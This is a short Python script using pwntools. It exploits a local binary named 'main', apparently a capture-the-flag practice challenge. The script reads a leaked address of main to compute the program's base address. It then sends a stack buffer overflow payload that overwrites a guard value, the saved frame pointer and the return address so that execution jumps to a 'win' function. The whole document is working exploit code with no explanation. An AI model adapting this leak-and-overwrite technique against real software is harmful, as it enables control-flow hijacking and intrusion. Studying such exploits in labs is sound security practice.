from pwn import *
io = process('./main')
elf = ELF('./main')
rop = ROP('./main')
io.recvuntil(b'randomness ')
leaked_main = io.recvline().decode()
log.info(f"[+] ==> Leaked_main : {leaked_main} ")
base_address = int(leaked_main,16) - elf.sym['main']
win = base_address + elf.sym['win']
payload = b'A' * (0x20 - 0x8) + p64(0xdeadbeefcafebabe) + b'B' * 8 + p64(win)
print(io.clean())
io.sendline(payload)
print(io.recv())